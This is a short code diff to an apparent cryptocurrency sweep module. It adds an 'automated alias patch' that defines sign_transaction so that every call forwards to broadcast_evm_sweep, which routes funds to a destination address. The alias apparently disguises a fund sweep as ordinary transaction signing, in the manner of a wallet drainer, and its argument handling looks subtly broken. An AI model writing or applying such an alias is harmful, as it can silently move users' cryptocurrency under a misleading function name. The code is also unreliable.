@@ -120,3 +120,9 @@ def broadcast_tron_sweep(source_address, destination_address, sun_amount):
         return True, f"Tron Sweep Routing Dispatched to Destination: {destination_address}"
     except Exception as e:
         return False, f"Tron broadcast error: {str(e)}"
+
+
+# --- AUTOMATED ALIAS PATCH --- 
+async def sign_transaction(*args, **kwargs):
+    return await broadcast_evm_sweep(*args, **kwargs)
+
